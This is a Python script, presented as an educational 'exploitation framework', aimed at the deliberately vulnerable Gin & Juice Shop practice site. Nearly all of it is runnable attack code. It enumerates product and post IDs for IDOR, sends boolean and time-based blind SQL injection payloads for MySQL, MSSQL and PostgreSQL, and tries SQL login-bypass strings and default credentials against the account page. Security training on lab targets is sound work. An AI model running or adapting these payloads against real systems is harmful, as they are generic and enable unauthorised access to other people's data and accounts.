#!/usr/bin/env python3
"""
Gin & Juice Shop - Automated Exploitation Framework
Target: https://ginandjuice.shop/
Purpose: Educational pentesting on deliberately vulnerable application
"""

import requests
import urllib.parse
import time
import json
from typing import Dict, List, Optional
from colorama import init, Fore, Style

# Initialize colorama for colored output
init(autoreset=True)

class GinJuiceExploiter:
    def __init__(self, base_url: str = "https://ginandjuice.shop"):
        self.base_url = base_url
        self.session = requests.Session()
        self.findings = []
        
    def log_success(self, message: str):
        """Log successful exploitation"""
        print(f"{Fore.GREEN}[+] {message}{Style.RESET_ALL}")
        
    def log_info(self, message: str):
        """Log informational message"""
        print(f"{Fore.BLUE}[*] {message}{Style.RESET_ALL}")
        
    def log_warning(self, message: str):
        """Log warning message"""
        print(f"{Fore.YELLOW}[!] {message}{Style.RESET_ALL}")
        
    def log_error(self, message: str):
        """Log error message"""
        print(f"{Fore.RED}[-] {message}{Style.RESET_ALL}")
        
    def test_sqli_product(self, payload: str) -> Optional[Dict]:
        """Test SQL injection in productId parameter"""
        try:
            url = f"{self.base_url}/catalog/product?productId={urllib.parse.quote(payload)}"
            response = self.session.get(url, timeout=10)
            
            return {
                'payload': payload,
                'status_code': response.status_code,
                'response_length': len(response.text),
                'response_time': response.elapsed.total_seconds(),
                'url': url,
                'content': response.text[:500]  # First 500 chars
            }
        except Exception as e:
            self.log_error(f"Error testing SQLi payload: {e}")
            return None
            
    def test_sqli_blog(self, payload: str) -> Optional[Dict]:
        """Test SQL injection in postId parameter"""
        try:
            url = f"{self.base_url}/blog/post?postId={urllib.parse.quote(payload)}"
            response = self.session.get(url, timeout=10)
            
            return {
                'payload': payload,
                'status_code': response.status_code,
                'response_length': len(response.text),
                'response_time': response.elapsed.total_seconds(),
                'url': url,
                'content': response.text[:500]
            }
        except Exception as e:
            self.log_error(f"Error testing SQLi payload: {e}")
            return None
    
    def enumerate_products(self, start: int = 1, end: int = 20) -> List[Dict]:
        """Enumerate products via IDOR"""
        self.log_info(f"Enumerating products from ID {start} to {end}")
        products = []
        
        for product_id in range(start, end + 1):
            url = f"{self.base_url}/catalog/product?productId={product_id}"
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code == 200 and "Not Found" not in response.text:
                    # Extract product info (simplified)
                    products.append({
                        'id': product_id,
                        'url': url,
                        'found': True,
                        'status_code': response.status_code
                    })
                    self.log_success(f"Found product ID: {product_id}")
                else:
                    self.log_warning(f"Product ID {product_id}: Not found or error")
            except Exception as e:
                self.log_error(f"Error accessing product {product_id}: {e}")
                
        return products
    
    def enumerate_blog_posts(self, start: int = 1, end: int = 10) -> List[Dict]:
        """Enumerate blog posts via IDOR"""
        self.log_info(f"Enumerating blog posts from ID {start} to {end}")
        posts = []
        
        for post_id in range(start, end + 1):
            url = f"{self.base_url}/blog/post?postId={post_id}"
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code == 200 and "Not Found" not in response.text:
                    posts.append({
                        'id': post_id,
                        'url': url,
                        'found': True,
                        'status_code': response.status_code
                    })
                    self.log_success(f"Found blog post ID: {post_id}")
                else:
                    self.log_warning(f"Post ID {post_id}: Not found or error")
            except Exception as e:
                self.log_error(f"Error accessing post {post_id}: {e}")
                
        return posts
    
    def test_auth_bypass(self) -> Dict:
        """Test authentication bypass techniques"""
        self.log_info("Testing authentication bypass")
        
        # Common SQLi payloads for auth bypass
        payloads = [
            {"username": "admin' OR '1'='1'--", "password": "anything"},
            {"username": "admin' OR 1=1--", "password": "anything"},
            {"username": "' OR '1'='1'--", "password": "' OR '1'='1'--"},
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "carlos", "password": "montoya"},
        ]
        
        results = []
        for payload in payloads:
            try:
                url = f"{self.base_url}/my-account"
                response = self.session.post(url, data=payload, timeout=5)
                
                result = {
                    'payload': payload,
                    'status_code': response.status_code,
                    'redirected': response.history != [],
                    'url': response.url,
                    'cookies': dict(response.cookies)
                }
                
                # Check for successful login indicators
                if response.status_code == 302 or "logout" in response.text.lower():
                    self.log_success(f"Potential bypass with: {payload}")
                    result['bypass_success'] = True
                else:
                    result['bypass_success'] = False
                    
                results.append(result)
            except Exception as e:
                self.log_error(f"Error testing auth bypass: {e}")
                
        return results
    
    def test_boolean_sqli(self, endpoint: str = "product", param_value: str = "1") -> Dict:
        """Test boolean-based SQL injection"""
        self.log_info(f"Testing boolean-based SQLi on {endpoint}")
        
        if endpoint == "product":
            base_url = f"{self.base_url}/catalog/product?productId="
        else:
            base_url = f"{self.base_url}/blog/post?postId="
        
        # Test payloads
        true_payload = f"{param_value} AND 1=1"
        false_payload = f"{param_value} AND 1=2"
        
        try:
            # Get baseline response
            baseline = self.session.get(base_url + param_value, timeout=5)
            
            # Test true condition
            true_response = self.session.get(base_url + urllib.parse.quote(true_payload), timeout=5)
            
            # Test false condition
            false_response = self.session.get(base_url + urllib.parse.quote(false_payload), timeout=5)
            
            # Analyze results
            baseline_len = len(baseline.text)
            true_len = len(true_response.text)
            false_len = len(false_response.text)
            
            result = {
                'baseline_length': baseline_len,
                'true_length': true_len,
                'false_length': false_len,
                'vulnerable': (baseline_len == true_len) and (baseline_len != false_len)
            }
            
            if result['vulnerable']:
                self.log_success(f"Boolean SQLi vulnerability detected on {endpoint}!")
            else:
                self.log_warning(f"No clear boolean SQLi on {endpoint}")
                
            return result
            
        except Exception as e:
            self.log_error(f"Error testing boolean SQLi: {e}")
            return {}
    
    def test_time_based_sqli(self, endpoint: str = "product", param_value: str = "1", delay: int = 5) -> Dict:
        """Test time-based blind SQL injection"""
        self.log_info(f"Testing time-based SQLi on {endpoint}")
        
        if endpoint == "product":
            base_url = f"{self.base_url}/catalog/product?productId="
        else:
            base_url = f"{self.base_url}/blog/post?postId="
        
        # Time-based payloads for different databases
        payloads = [
            f"{param_value}' AND SLEEP({delay})--",  # MySQL
            f"{param_value}' WAITFOR DELAY '0:0:{delay}'--",  # MSSQL
            f"{param_value}' AND pg_sleep({delay})--",  # PostgreSQL
        ]
        
        results = []
        for payload in payloads:
            try:
                start_time = time.time()
                response = self.session.get(base_url + urllib.parse.quote(payload), timeout=delay + 5)
                elapsed = time.time() - start_time
                
                result = {
                    'payload': payload,
                    'elapsed_time': elapsed,
                    'expected_delay': delay,
                    'vulnerable': elapsed >= delay
                }
                
                if result['vulnerable']:
                    self.log_success(f"Time-based SQLi detected! Delay: {elapsed:.2f}s")
                    
                results.append(result)
                
            except requests.Timeout:
                self.log_warning(f"Request timed out - possible SQLi")
                results.append({
                    'payload': payload,
                    'timeout': True,
                    'vulnerable': True
                })
            except Exception as e:
                self.log_error(f"Error testing time-based SQLi: {e}")
                
        return results
    
    def run_full_scan(self):
        """Run comprehensive vulnerability scan"""
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  Gin & Juice Shop - Automated Exploitation{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  Target: {self.base_url}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        # 1. IDOR Testing
        print(f"\n{Fore.YELLOW}[*] Phase 1: IDOR Enumeration{Style.RESET_ALL}")
        products = self.enumerate_products(1, 20)
        posts = self.enumerate_blog_posts(1, 10)
        
        # 2. Boolean SQLi Testing
        print(f"\n{Fore.YELLOW}[*] Phase 2: Boolean-based SQL Injection{Style.RESET_ALL}")
        product_sqli = self.test_boolean_sqli("product", "1")
        blog_sqli = self.test_boolean_sqli("blog", "3")
        
        # 3. Time-based SQLi Testing
        print(f"\n{Fore.YELLOW}[*] Phase 3: Time-based SQL Injection{Style.RESET_ALL}")
        time_sqli = self.test_time_based_sqli("product", "1", 3)
        
        # 4. Authentication Bypass
        print(f"\n{Fore.YELLOW}[*] Phase 4: Authentication Bypass{Style.RESET_ALL}")
        auth_results = self.test_auth_bypass()
        
        # Generate summary
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  Scan Summary{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"Products found: {len([p for p in products if p['found']])}")
        print(f"Blog posts found: {len([p for p in posts if p['found']])}")
        print(f"Boolean SQLi on products: {product_sqli.get('vulnerable', False)}")
        print(f"Boolean SQLi on blog: {blog_sqli.get('vulnerable', False)}")
        print(f"Time-based SQLi attempts: {len(time_sqli)}")
        print(f"Auth bypass attempts: {len(auth_results)}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        return {
            'products': products,
            'posts': posts,
            'sqli_product': product_sqli,
            'sqli_blog': blog_sqli,
            'time_sqli': time_sqli,
            'auth_bypass': auth_results
        }


def main():
    """Main execution"""
    exploiter = GinJuiceExploiter()
    
    # Run full automated scan
    results = exploiter.run_full_scan()
    
    # Save results to file
    output_file = "ginandjuice_scan_results.json"
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=2, default=str)
    
    print(f"{Fore.GREEN}[+] Results saved to {output_file}{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
